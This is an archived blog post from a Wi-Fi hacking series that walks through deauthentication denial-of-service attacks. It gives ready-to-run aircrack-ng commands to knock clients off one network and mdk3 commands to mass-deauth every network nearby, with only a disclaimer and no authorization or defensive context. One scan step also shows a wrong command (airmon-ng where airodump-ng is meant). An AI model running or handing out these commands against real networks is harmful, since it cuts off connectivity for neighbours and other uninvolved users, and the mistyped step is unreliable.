---
layout: post
title: "WIRELESS JAMMERS: DEAUTH ATTACKS"
date: 2020-12-23T18:43:00+05:30
categories: ["Hacking", "WiFi Hacking series"]
description: "This post sheds light to how the attackers are able to bring down a single or all the wireless networks around. We claim no responsibility of the harm done via any reader. This"
original_url: "https://blog.alphathreat.in/index.php?post/2020/12/23/Wireless-Jammers%3A-Deauth-Attacks"
---

This post sheds light to how the attackers are able to bring down a single or all the wireless networks around.

We claim no responsibility of the harm done via any reader. This post is for educational purpose just like our every post.

### DEAUTH ATTACK

It is a Denial of service attack (DoS) targeted between router and the connectced clients. A crafted deauth packet is sent to router which results in termination of the connection between router and a client.

The below diagram depicts the theory

<p class="img-missing" role="note"><strong>Screenshot unavailable</strong> — <code>deauth_wifi.png</code> was not captured by the Internet Archive.</p>

### STEPS

The steps required to initiate a deauth consists of below steps:

1. Initiate promiscous mode AKA monitor mode
2. Scan for networks
3. Select target network
4. Launch the attack

#### 1. INITIATE PROMISCOUS MODE

airmon-ng start &lt;WIRELESS INTERFACE&gt;

```

airmon-ng start wlp3s0
```

*Make sure to check our previous tutorial on "[Attacking WPS](https://blog.securityowls.com/index.php?post/2020/12/15/WiFi-Pentest%3A-Auditing-WPS2 "Attacking WPS")" if you are stuck in this step*

#### 2. SCAN FOR NETWORKS

airodump-ng &lt;WIRELESS INTERFACE&gt;

```

airmon-ng wlp3s0mon
```

#### 3. SELECT TARGET NETWORK

From the airodump window select the target network and copy its BSSID (first column)

4. LAUNCH THE ATTACK

aireplay-ng -0 0 -a &lt;BSSID&gt; &lt;MONITOR INTERFACE&gt;

```

aireplay-ng -0 0 -a 30:b5:c2:dd:ee:ff wlp3s0mon
```

<p class="img-missing" role="note"><strong>Screenshot unavailable</strong> — <code>aireplay_deauth_wifi.png</code> was not captured by the Internet Archive.</p>

This tactic is for a single wifi network, in order to perform a mass deauth attack in a neighbourhood, attackers use a more sophisticated tool called as **mdk3** which is builtin Kali and other pentesting distros. Beware this will cause total havoc in your neighbourhood due to unavailability of Wifi.

**SYNTAX**

# mdk3 &lt;INTERFACE&gt; d

```

mdk3 wlp3s0mon d
```

In order to fix it to a particular channel

# mdk3 &lt;INTERFACE&gt; d -c &lt;CHANNEL NUMBER&gt;

```

mdk3 wlp3s0mon d -c 2
```
